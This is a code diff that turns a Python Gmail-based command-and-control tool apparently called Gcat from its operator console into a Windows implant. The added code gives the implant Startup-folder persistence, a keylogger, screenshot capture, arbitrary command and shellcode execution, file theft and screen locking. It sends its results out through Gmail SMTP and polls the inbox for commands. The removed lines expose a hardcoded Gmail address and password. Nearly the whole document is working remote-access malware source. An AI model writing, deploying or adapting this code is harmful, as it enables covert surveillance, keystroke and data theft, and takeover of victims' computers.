@@ -1,30 +1,79 @@
-import argparse
-import email
-import imaplib
+import subprocess
 import sys
-import uuid
-import string
-import ast
 import os
+import base64
+import binascii
+import threading
+import time
 import random
-
-from datetime import datetime
-from base64 import b64decode
+import string
+import imaplib
+import email
+import uuid
+import platform
+import ctypes
+import ast
+import win32process
+import win32api
+import win32con
+import win32gui
+#import logging
+import pythoncom
+import pyHook
+import win32security
+import shutil
+from PIL import ImageGrab
+#from traceback import print_exc, format_exc
+from ntsecuritycon import *
+from win32com.shell import shell
 from smtplib import SMTP
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
 from email import Encoders
-
 #######################################
-gmail_user = 'gcat.test.mofo@gmail.com'
-gmail_pwd = 'prettyflypassword'
+gmail_user = 'dummy@gmail.com'
+gmail_pwd = 'password'
 server = "smtp.gmail.com"
 server_port = 587
 #######################################
+#To copy it in startup in windows :)
+usr = os.environ.get( "USERNAME" )
+Filename =os.path.basename(__file__)
+length = len(Filename)
+newvar = Filename[:length-3]+'.exe'
+path = 'C:\\Users\\'+usr+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+current = os.getcwd()
+if path == current :
+    k =1
+else :    
+    shutil.copy2(newvar, path)
 
-def genJobID(slen=7):
+#######################################
+
+#Prints error messages and info to stdout
+#verbose = True
+#log_level = 20 
+
+#if verbose is True:
+#    log_level = 10
+
+#logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+
+#generates a unique uuid 
+uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
+
+def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
+
+def isAdmin():
+    return shell.IsUserAnAdmin()
+
+def getSysinfo():
+    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])
+
+def detectForgroundWindow():
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 class msgparser:
 
@@ -49,182 +98,274 @@ class msgparser:
     def getDateHeader(self, msg_data):
         self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
-class Gcat:
+class KeyLogger(threading.Thread):
 
     def __init__(self):
-        self.c = imaplib.IMAP4_SSL(server)
-        self.c.login(gmail_user, gmail_pwd)
 
-    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
+        threading.Thread.__init__(self)
 
-        if (botid is None) or (jobid is None):
-            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
+        self.jobid = None
+        self.key_buffer = ''
+
+        self.daemon = True
+
+    def run(self):
+        #logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
+        t1 = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger started'}, self.jobid,))
+        t2 = threading.Thread(name='watchKeys', target=self.watchKeys)
         
-        sub_header = 'gcat:{}:{}'.format(botid, jobid)
+        for t in [t1, t2]:
+            t.setDaemon(True)
+            t.start()
 
-        msg = MIMEMultipart()
-        msg['From'] = sub_header
-        msg['To'] = gmail_user
-        msg['Subject'] = sub_header
-        msgtext = {'CMD': cmd, 'ARG': arg}
-        msg.attach(MIMEText(str(msgtext)))
-        
-        for attach in attachment:
-            if os.path.exists(attach) == True:  
-                part = MIMEBase('application', 'octet-stream')
-                part.set_payload(open(attach, 'rb').read())
-                Encoders.encode_base64(part)
-                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
-                msg.attach(part)
+        while True:
+            hm = pyHook.HookManager() 
+            hm.KeyDown = self.onKeyboardEvent 
+            hm.HookKeyboard() 
+            pythoncom.PumpMessages()
 
-        mailServer = SMTP()
-        mailServer.connect(server, server_port)
-        mailServer.starttls()
-        mailServer.login(gmail_user,gmail_pwd)
-        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
-        mailServer.quit()
+    def stop(self):
+        #logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
+        t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger stopped'}, self.jobid,))
+        t.setDaemon(True)
+        t.start()
 
-        print "[*] Command sent successfully with jobid: {}".format(jobid)
-
-
-    def checkBots(self):
-        bots = []
-        self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')")
-
-        for idn in idlist[0].split():
-            msg_data = self.c.uid('fetch', idn, '(RFC822)')
-            msg = msgparser(msg_data)
+    def watchKeys(self):
+        while True:
+            if len(self.key_buffer) >= 100:
+                keys = self.key_buffer
+                t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': r'{}'.format(keys)}, self.jobid,))
+                t.setDaemon(True)
+                t.start()
+                self.key_buffer = ''
             
-            try:
-                botid = str(uuid.UUID(msg.subject.split(':')[1]))
-                if botid not in bots:
-                    bots.append(botid)
+            time.sleep(0.5)
+
+    def onKeyboardEvent(self, event):
+        if event.Ascii != 0 or 8:
+            self.key_buffer += chr(event.Ascii)
+        
+        if event.Ascii == 13:
+            self.key_buffer += chr(event.Ascii)
+
+class download(threading.Thread):
+
+    def __init__(self, jobid, filepath):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.filepath = filepath
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            if os.path.exists(self.filepath) is True:
+                sendEmail({'CMD': 'download', 'RES': 'Success'}, self.jobid, [self.filepath])
+            else:
+                sendEmail({'CMD': 'download', 'RES': 'Path to file invalid'}, self.jobid)
+        except Exception as e:
+            sendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, self.jobid)
+
+class lockScreen(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            ctypes.windll.user32.LockWorkStation()
+            sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=self.jobid)
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
+
+class screenshot(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+
+        self.daemon = True
+        self.start()
+    
+    def run(self):
+        try:
+            img=ImageGrab.grab()
+            saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
+            img.save(saveas)
+            sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=self.jobid, attachment=[saveas])
+            os.remove(saveas)
+        except Exception as e:
+            #if verbose == True: print_exc()
+            pass
+
+class execShellcode(threading.Thread):
+
+    def __init__(self, shellc, jobid):
+        threading.Thread.__init__(self)
+        self.shellc = shellc
+        self.jobid = jobid
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            shellcode = bytearray(self.shellc)
+
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
+                                                      ctypes.c_int(len(shellcode)), 
+                                                      ctypes.c_int(0x3000), 
+                                                      ctypes.c_int(0x40))
+        
+            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+        
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 
+            
+            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                                     ctypes.c_int(0),
+                                                     ctypes.c_int(ptr),
+                                                     ctypes.c_int(0),
+                                                     ctypes.c_int(0),
+                                                     ctypes.pointer(ctypes.c_int(0)))
+            
+            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+
+        except Exception as e:
+            #if verbose == True: print_exc()
+            pass
+
+class execCmd(threading.Thread):
+
+    def __init__(self, command, jobid):
+        threading.Thread.__init__(self)
+        self.command = command
+        self.jobid = jobid
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout_value = proc.stdout.read()
+            stdout_value += proc.stderr.read()
+
+            sendEmail({'CMD': self.command, 'RES': stdout_value}, jobid=self.jobid)
+        except Exception as e:
+            #if verbose == True: print_exc()
+            pass
+
+def sendEmail(text, jobid='', attachment=[], checkin=False):
+    sub_header = uniqueid
+    if jobid:
+        sub_header = 'imp:{}:{}'.format(uniqueid, jobid)
+    elif checkin:
+        sub_header = 'checkin:{}'.format(uniqueid)
+
+    msg = MIMEMultipart()
+    msg['From'] = sub_header
+    msg['To'] = gmail_user
+    msg['Subject'] = sub_header
+
+    message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': text}
+    msg.attach(MIMEText(str(message_content)))
+
+    for attach in attachment:
+        if os.path.exists(attach) == True:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(open(attach, 'rb').read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
+            msg.attach(part)
+
+    while True:
+        try:
+            mailServer = SMTP()
+            mailServer.connect(server, server_port)
+            mailServer.starttls()
+            mailServer.login(gmail_user,gmail_pwd)
+            mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
+            mailServer.quit()
+            break
+        except Exception as e:
+            #if verbose == True: print_exc()
+            time.sleep(10)
+
+def checkJobs():
+    #Here we check the inbox for queued jobs, parse them and start a thread
+
+    keylogger = KeyLogger()
+
+    while True:
+
+        try:
+            c = imaplib.IMAP4_SSL(server)
+            c.login(gmail_user, gmail_pwd)
+            c.select("INBOX")
+
+            typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
+
+            for msg_id in id_list[0].split():
+                
+                #logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
+                
+                msg_data = c.uid('fetch', msg_id, '(RFC822)')
+                msg = msgparser(msg_data)
+                jobid = msg.subject.split(':')[2]
+                
+                if msg.dict:
+                    cmd = msg.dict['CMD'].lower()
+                    arg = msg.dict['ARG']
+
+                    #logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
+
+                    if cmd == 'execshellcode':
+                        execShellcode(arg, jobid)
+
+                    elif cmd == 'download':
+                        download(jobid, arg)
+
+                    elif cmd == 'screenshot':
+                        screenshot(jobid)
                     
-                    print botid, msg.dict['SYS']
-            
-            except ValueError:
-                pass
+                    elif cmd == 'cmd':
+                        execCmd(arg, jobid)
 
-    def getBotInfo(self, botid):
+                    elif cmd == 'lockscreen':
+                        lockScreen(jobid)
 
-        if botid is None:
-            sys.exit("[-] You must specify a client id (-id)")
+                    elif cmd == 'startkeylogger':
+                        if not keylogger.isAlive():
+                            keylogger.jobid = jobid
+                            keylogger.start()
 
-        self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid))
+                    elif cmd == 'stopkeylogger':
+                        if keylogger.isAlive():
+                            keylogger.stop()
 
-        for idn in idlist[0].split():
-            msg_data = self.c.uid('fetch', idn, '(RFC822)')
-            msg = msgparser(msg_data)
-            
-            print "ID: " + botid
-            print "DATE: '{}'".format(msg.date)
-            print "OS: " + msg.dict['SYS']
-            print "ADMIN: " + str(msg.dict['ADMIN']) 
-            print "FG WINDOW: '{}'\n".format(msg.dict['FGWINDOW'])
+                    elif cmd == 'forcecheckin':
+                        sendEmail("Host checking in as requested", checkin=True)
 
-    def getJobResults(self, botid, jobid):
+                    else:
+                        raise NotImplementedError
 
-        if (botid is None) or (jobid is None):
-            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
+            c.logout()
 
-        self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid))
-
-        for idn in idlist[0].split():
-            msg_data = self.c.uid('fetch', idn, '(RFC822)')
-            msg = msgparser(msg_data)
-
-            print "DATE: '{}'".format(msg.date)
-            print "JOBID: " + jobid
-            print "FG WINDOW: '{}'".format(msg.dict['FGWINDOW'])
-            print "CMD: '{}'".format(msg.dict['MSG']['CMD'])
-            print ''
-            print msg.dict['MSG']['RES'] + '\n'
-
-            if msg.attachment:
-
-                if msg.dict['MSG']['CMD'] == 'screenshot':
-                    imgname = '{}-{}.png'.format(botid, jobid)
-                    with open("./data/" + imgname, 'wb') as image:
-                        image.write(b64decode(msg.attachment))
-                        image.close()
-
-                    print "[*] Screenshot saved to ./data/" + imgname
-
-                elif msg.dict['MSG']['CMD'] == 'download':
-                    filename = "{}-{}".format(botid, jobid)
-                    with open("./data/" + filename, 'wb') as dfile:
-                        dfile.write(b64decode(msg.attachment))
-                        dfile.close()
-
-                    print "[*] Downloaded file saved to ./data/" + filename
-
-    def logout():
-        self.c.logout()
-
+            time.sleep(10)
+        
+        except Exception as e:
+            #logging.debug(format_exc())
+            time.sleep(10)
 
 if __name__ == '__main__':
-
-    parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
-    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
-    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
-    
-    agroup = parser.add_argument_group()
-    blogopts = agroup.add_mutually_exclusive_group()
-    blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
-    blogopts.add_argument("-info", dest='info', action='store_true', help='Retrieve info on specified client')
-
-    sgroup = parser.add_argument_group("Commands", "Commands to execute on an implant")
-    slogopts = sgroup.add_mutually_exclusive_group()
-    slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
-    slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
-    slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
-    slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
-    slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
-    slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
-    slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
-    slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
-    
-    if len(sys.argv) is 1:
-        parser.print_help()
-        sys.exit()
-
-    args = parser.parse_args()
-    
-    gcat = Gcat()
-    jobid = genJobID()
-
-    if args.list:
-        gcat.checkBots()
-
-    elif args.info:
-        gcat.getBotInfo(args.id)
-
-    elif args.cmd:
-        gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)
-
-    elif args.shellcode:
-        gcat.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())
-
-    elif args.download:
-        gcat.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))
-
-    elif args.screen:
-        gcat.sendEmail(args.id, jobid, 'screenshot')
-
-    elif args.lockscreen:
-        gcat.sendEmail(args.id, jobid, 'lockscreen')
-
-    elif args.forcecheckin:
-        gcat.sendEmail(args.id, jobid, 'forcecheckin')
-
-    elif args.keylogger:
-        gcat.sendEmail(args.id, jobid, 'startkeylogger')
-
-    elif args.stopkeylogger:
-        gcat.sendEmail(args.id, jobid, 'stopkeylogger')
-
-    elif args.jobid:
-        gcat.getJobResults(args.id, args.jobid)
+    sendEmail("0wn3d!", checkin=True)
+    try:
+        checkJobs()
+    except KeyboardInterrupt:
+        pass
